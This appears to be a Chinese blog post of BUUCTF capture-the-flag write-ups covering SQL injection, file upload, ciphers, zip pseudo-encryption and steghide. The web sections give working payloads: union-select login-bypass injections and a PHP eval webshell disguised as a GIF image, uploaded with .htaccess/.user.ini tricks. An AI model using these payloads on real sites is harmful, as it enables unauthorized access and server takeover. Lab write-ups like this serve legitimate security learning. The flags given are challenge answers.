# BUUCTF-sql注入联合查询的创建虚拟表-词频-steghide的使用

第七周第三次

**目录**

[TOC]



## WEB

### [GXYCTF2019]BabySQli

这是一道很新的题目

我们打开环境 发现登入注册界面 先看看源码有没有提示

发现有一个

php文件 进入看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/dafa922f32304177d3807df62a933c7e.png" alt="" style="max-height:269px; box-sizing:content-box;" />


发现加密 先base32 再64



<img src="https://i-blog.csdnimg.cn/blog_migrate/ecc7e449e4fb5740c77d4e687fbb874a.png" alt="" style="max-height:332px; box-sizing:content-box;" />


```sql
select * from user where username = '$name'
```

发现就是很简单的字符型注入

开始尝试万能密码

```csharp
1' or 1=1#
select * from user where username = '1'or 1=1#'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8760639fbd3cc4d2092dc0b08871cb79.png" alt="" style="max-height:228px; box-sizing:content-box;" />


发现有过滤

bpfuzz看看

发现过滤了万能密码 （） or for 这些

这里需要明白联合查询的特性

```cobol
如果你输入了 union select 1，2，3#
会在数据库临时 打印一张虚拟的表
```

 [BUUCTF | [GXYCTF2019]BabySQli_山川绿水的博客-CSDN博客](https://blog.csdn.net/m_de_g/article/details/122121801) 

该文章的图片



<img src="https://i-blog.csdnimg.cn/blog_migrate/96751a9c861b33894b0091d23bf82485.png" alt="" style="max-height:844px; box-sizing:content-box;" />


所以我们需要把我们的登入账号密码 作为临时密码来登入

我们先猜字节



```vbnet
admin' order by 4#
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/152dc42afb243ce1cdef27516872c7c7.png" alt="" style="max-height:130px; box-sizing:content-box;" />


过滤了 我们随便试试看 是  order 还是 by

```vbnet
admin' Order by 4#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e4e6c7e1c0e5cf4ceca711622962bcd9.png" alt="" style="max-height:127px; box-sizing:content-box;" />


3个字节

我们开始 创建虚拟的表

```csharp
账号 0' union select 1,'admin','123'#
密码 123
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6cca5740252628794e89fbce0012a61a.png" alt="" style="max-height:240px; box-sizing:content-box;" />


发现出错 这里就没有提示 我们应该判断是MD5加密密码 因为MD5加密不可逆

这里是没有提示的 只能猜

要加密小写的（试出来的）



<img src="https://i-blog.csdnimg.cn/blog_migrate/baf4c2d1645b9ed7d073f0482f6fad40.png" alt="" style="max-height:142px; box-sizing:content-box;" />


```cobol
账号 0' union select 1,'admin','202cb962ac59075b964b07152d234b70'#
密码 123
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/0ea3559c81801a6a0715df9c8fefc5e0.png" alt="" style="max-height:256px; box-sizing:content-box;" />


### [GXYCTF2019]BabyUpload

这道题还比较简单 用我们以前积累的东西就可以上传成功

编写payload

1.jpg

```cobol
GIF89a
<script language='php'>eval($_POST['a']);</script>
```

这里加了文件头  和 js辅助 来防止文件头检查 和php文件检查

现在有两个 一个是上传.user.ini 另一个是.htaccess

一个一个试过去吧

.htaccess

```bash
SetHandler application/x-httpd-php
```

这里没加文件头其实也无所谓 没有进行检查

.user.ini

```cobol
GIF89a                  
auto_prepend_file=1.jpg 
auto_append_file=1.jpg  
```

我们开始上传

先上传1.jpg



<img src="https://i-blog.csdnimg.cn/blog_migrate/c7fe228335d50547e64f2a54fdac59c2.png" alt="" style="max-height:104px; box-sizing:content-box;" />


再上传 .user.ini



<img src="https://i-blog.csdnimg.cn/blog_migrate/3f813539f0fcf1399d1d62f7ac18e618.png" alt="" style="max-height:226px; box-sizing:content-box;" />


我们抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/f1e86d276575684359041270c4601ceb.png" alt="" style="max-height:64px; box-sizing:content-box;" />


更改类型为

```bash
image/jpeg
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/94ac7bf802e089281d4eec2f5e21748e.png" alt="" style="max-height:145px; box-sizing:content-box;" />


上传成功 看看能不能链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/3a47fa8c698a60ada3fbed359a25680f.png" alt="" style="max-height:699px; box-sizing:content-box;" />


很显然不可以

所以我们看看上传另一个

一样的步骤



<img src="https://i-blog.csdnimg.cn/blog_migrate/5998ec5173703cfcc23bccbd06e1dc29.png" alt="" style="max-height:191px; box-sizing:content-box;" />


我们看看能不能直接链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/0975c9536f01a583ab6b9c6a4289dd20.png" alt="" style="max-height:699px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/30d6b4c7e67a3a6539e16d4847ac176f.png" alt="" style="max-height:699px; box-sizing:content-box;" />


## Crypto

### 世上无难事

## 



 [quipqiup - cryptoquip and cryptogram solver](https://quipqiup.com/) 

单词太多了 进去网站分析



<img src="https://i-blog.csdnimg.cn/blog_migrate/f3a7e86d4fdf7176bc84cd68cbde5a56.png" alt="" style="max-height:72px; box-sizing:content-box;" />


把他变为 小写

```cobol
flag{640e11012805f211b0ab24ff02a1ed09}
```

### old-fashion



和上面一样的

## Misc

### 面具下的flag

下载文件 放入010查看

发现有 pk



<img src="https://i-blog.csdnimg.cn/blog_migrate/d1ef86fa546d1a0c2125f7722b99a6f3.png" alt="" style="max-height:443px; box-sizing:content-box;" />


然后我们开始 改后缀



<img src="https://i-blog.csdnimg.cn/blog_migrate/4159b5970018fe556755b53ec430904c.png" alt="" style="max-height:600px; box-sizing:content-box;" />


发现加密 看看是不是伪加密 放入010

```cobol
50 4B 03 04
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0b5144472a6fe5143a4c52039f6fb0b1.png" alt="" style="max-height:38px; box-sizing:content-box;" />


发现是 08 没有加密

```cobol
50 4B 01 02
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/71a367e11ea3e6e3014fad70eb1776c4.png" alt="" style="max-height:64px; box-sizing:content-box;" />


发现后面是09 说明就是伪加密

我们改为偶数



<img src="https://i-blog.csdnimg.cn/blog_migrate/986ba8fde4b0693465f25a065690f96e.png" alt="" style="max-height:137px; box-sizing:content-box;" />


使用kali的7z

```cobol
7z x flag.vmdk 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/168bc4c2902714e7cea672e0c0de7caf.png" alt="" style="max-height:430px; box-sizing:content-box;" />


发现加密

ook



<img src="https://i-blog.csdnimg.cn/blog_migrate/5adf1356054eb3fe6d30b6f6675f6f35.png" alt="" style="max-height:203px; box-sizing:content-box;" />


只有一半 看看其他的



Brainfuck



<img src="https://i-blog.csdnimg.cn/blog_migrate/1396820baa941eabd255a30e186aef74.png" alt="" style="max-height:146px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c240bd4cea3bb439c386083a16c96c1d.png" alt="" style="max-height:348px; box-sizing:content-box;" />




```cobol
flag{N7F5_AD5_i5_funny!}
```

 [Brainfuck/Ook! Obfuscation/Encoding [splitbrain.org]](https://www.splitbrain.org/services/ook) 

### 九连环

下载完 得到文件

图片 放入010看看有没有藏文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/7d5d6e07961784fe2b849d0ff4df6fc4.png" alt="" style="max-height:376px; box-sizing:content-box;" />


改后缀



<img src="https://i-blog.csdnimg.cn/blog_migrate/f84d1b66679eebf39624b85335e068be.png" alt="" style="max-height:592px; box-sizing:content-box;" />


发现加密 看看有没有伪加密



<img src="https://i-blog.csdnimg.cn/blog_migrate/993bd4ab991a771286724b0dab9561a5.png" alt="" style="max-height:83px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/6b189eec800fc6f26fe93c001e59c3b5.png" alt="" style="max-height:333px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/a53711ced88de526240aa70b30c9fedf.png" alt="" style="max-height:510px; box-sizing:content-box;" />


图片解压出来了 我们看看有没有隐藏东西放入010 没有 看看有没有隐写

放入kali



```undefined
steghide info filename
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7e0ae40f65a5c90b211abce31a5c4115.png" alt="" style="max-height:152px; box-sizing:content-box;" />




发现隐写了

分离

```undefined
steghide extract -sf filename
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8e713d3f6ec38830e3d889a059969ce2.png" alt="" style="max-height:138px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/ef57d4bcdd0fec4f204508cea0195e59.png" alt="" style="max-height:147px; box-sizing:content-box;" />


得到密码 解压



<img src="https://i-blog.csdnimg.cn/blog_migrate/4e4dcc1da630a1488851d0778f83a48a.png" alt="" style="max-height:137px; box-sizing:content-box;" />